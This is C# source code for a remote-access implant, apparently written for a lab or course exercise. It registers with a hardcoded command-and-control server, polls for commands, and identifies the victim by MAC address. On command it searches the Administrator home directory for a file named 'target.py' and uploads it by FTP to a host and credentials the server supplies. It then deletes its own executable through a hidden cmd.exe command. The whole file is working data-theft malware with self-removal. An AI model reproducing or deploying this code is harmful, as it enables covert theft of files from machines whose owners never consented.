using System.Net;
// using System.Net.Http;
using System.Net.NetworkInformation;
using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Windows.Forms;
using System.Runtime.InteropServices;


namespace Implant
{
    class Connection {
        static string cmd = "0"; // Current command
        static string srvip = "192.168.68.128"; // Server IP (passed in)
        static string ftpserv = ""; // FTP Server
        static string ftpuser = ""; // FTP User
        static string ftppass = ""; // FTP Password
        static int timeout = 30; // Seconds between heartbeats


        // FTP Connection, uploading file at location file_loc
        static void ExfilData(string ip, string user, string pass, string file_loc)
        {
          try{
            FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + ip + "/html/target.py");
            request.Method = WebRequestMethods.Ftp.UploadFile;

            request.Credentials = new NetworkCredential(user, pass);

            request.Method = WebRequestMethods.Ftp.UploadFile;
            request.KeepAlive = false;
            request.UseBinary = true;
            request.UsePassive = true;
            using (FileStream fs = File.Open(file_loc, FileMode.Open, FileAccess.Read))
            {
              using (Stream requestStream = request.GetRequestStream())
              {
                fs.CopyTo(requestStream);
                KillMsg();
                Kill();
              }
            }

          }
          catch (Exception ex)
          {
             // Console.WriteLine(ex.Message.ToString());
          }


        }

        // Gets the machine's MAC address
        static string GetMAC()
        {
          string macAddr =
            (
                from nic in NetworkInterface.GetAllNetworkInterfaces()
                where nic.OperationalStatus == OperationalStatus.Up
                select nic.GetPhysicalAddress().ToString()
            ).FirstOrDefault();
          return macAddr;
        }

        // Gets the machine's IP
        static string GetIP()
        {
          string content;
          HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://icanhazip.com");
          using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
          using (Stream stream = response.GetResponseStream())
          using (StreamReader sr = new StreamReader(stream))
            {
                content = sr.ReadLine();
            }

          string[] lines = content.Split(new string[] {Environment.NewLine}, StringSplitOptions.None);
          return lines[0];
        }

        // Initiate an HTTP connection, then read the command from it.
        // If the IP address given is invalid, this will just hang until it times out .
        static void Register()
        {
          string MAC = GetMAC();
          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/register");
          client.Method = "POST";
          string postData = "agent_id=" + MAC;
          postData += "&command=" + cmd;
          var data = Encoding.ASCII.GetBytes(postData);
          client.ContentType = "application/x-www-form-urlencoded";
          client.ContentLength = data.Length;
          int tmp = ServicePointManager.DefaultConnectionLimit;
          using (var stream = client.GetRequestStream())
          {
            stream.Write(data, 0, data.Length);
          }
          var response = (HttpWebResponse)client.GetResponse();
          cmd = response.GetResponseHeader("cmd");
          string responseText;
          // Console.WriteLine("Registration sent, response:");
          using (StreamReader sr = new StreamReader(response.GetResponseStream()))
          {
            responseText = sr.ReadToEnd();
          }
          // Console.WriteLine(responseText);
          return;
        }

        // The HTTP request for the Exfil info
        static void Exfil(int Found, string file_loc)
        {
          string MAC = GetMAC();

          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/exfil");
          client.Method = "POST";
          string postData = "agent_id=" + MAC;
          postData += "&found=" + Found.ToString();
          var data = Encoding.ASCII.GetBytes(postData);
          client.ContentType = "application/x-www-form-urlencoded";
          client.ContentLength = data.Length;
          using (var stream = client.GetRequestStream())
          {
            stream.Write(data, 0, data.Length);
          }
          var response = (HttpWebResponse)client.GetResponse();
          // Console.WriteLine("Exfil message sent, response: ");
          string responseText;
          using (StreamReader sr = new StreamReader(response.GetResponseStream()))
          {
            responseText = sr.ReadToEnd();
          }
          // Console.WriteLine(responseText);

          cmd = response.GetResponseHeader("cmd");
          if(Found == 1) {
            ftpserv = response.GetResponseHeader("host");
            ftpuser = response.GetResponseHeader("username");
            ftppass = response.GetResponseHeader("password");
            ExfilData(ftpserv, ftpuser, ftppass, file_loc);
          }
          return;
        }

        // The periodic heartbeat request
        static void HeartBeat()
        {
          string MAC = GetMAC();

          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/command");
          client.Method = "POST";
          var postData = "agent_id=" + MAC;
          var data = Encoding.ASCII.GetBytes(postData);
          client.ContentType = "application/x-www-form-urlencoded";
          client.ContentLength = data.Length;
          using (var stream = client.GetRequestStream())
          {
            stream.Write(data, 0, data.Length);
          }
          var response = (HttpWebResponse)client.GetResponse();
          cmd = response.GetResponseHeader("cmd");
          // Console.WriteLine("Heartbeat sent, response: ");
          string responseText;
          using (StreamReader sr = new StreamReader(response.GetResponseStream()))
          {
            responseText = sr.ReadToEnd();
          }
          // Console.WriteLine(responseText);

          return;
        }

        // The acknowledgement of the kill command (doesn't read response)
        static void KillMsg()
        {
          string MAC = GetMAC();

          HttpWebRequest client = (HttpWebRequest)WebRequest.Create("http://" + srvip + ":8080/manual_kill");
          client.Method = "POST";
          var postData = "agent_id=" + MAC;
          var data = Encoding.ASCII.GetBytes(postData);
          client.ContentType = "application/x-www-form-urlencoded";
          client.ContentLength = data.Length;
          using (var stream = client.GetRequestStream())
          {
            stream.Write(data, 0, data.Length);
          }
          client.GetResponse();
          // Console.WriteLine("Kill acknowledgement sent.");
          return;
        }

        // Kills and deletes the program file
        // Starts a command line (async) to delete the file after five seconds, then kills the process
        static void Kill()
        {
          // Console.WriteLine("Killing.");
          Process.Start( new ProcessStartInfo()
          {
              Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath +"\"",
              WindowStyle = ProcessWindowStyle.Hidden, 
              CreateNoWindow = true, 
              FileName = "cmd.exe"
          });


          Environment.Exit(0);
        }

        // Search the entire home directory for a file called target.py, then Exfil
        static void FileSearch()
        {
          // Console.WriteLine("Searching...");
          string[] filelist = Directory.GetFiles(@"C:\Documents and Settings\Administrator", "*target.py", SearchOption.AllDirectories);
          if(filelist.Length == 0)
          {
            // Console.WriteLine("File not found.");
            Exfil(0, "");

          }
          else
          {
            // Console.WriteLine("File found at " + filelist[0]);
            Exfil(1, filelist[0]);
          }
          return;
        }

        static void Main(string[] args)
        {

          // Console.WriteLine("DEBUG: IP - " + (string)GetIP());
          // Console.WriteLine("DEBUG: MAC - " + (string)GetMAC());

          Register(); // will hang if server ip not valid
          while (true) {
            // Console.WriteLine(cmd);
            switch(cmd) {
              case "0":
                System.Threading.Thread.Sleep(timeout);
                HeartBeat();
                break;
              case "1":
                FileSearch();
                break;
              case "2":
                KillMsg();
                Kill();
                break; //should be unreachable but w/e
              default:
                cmd = "0";
                break;
            }
          }



        }
    }
}
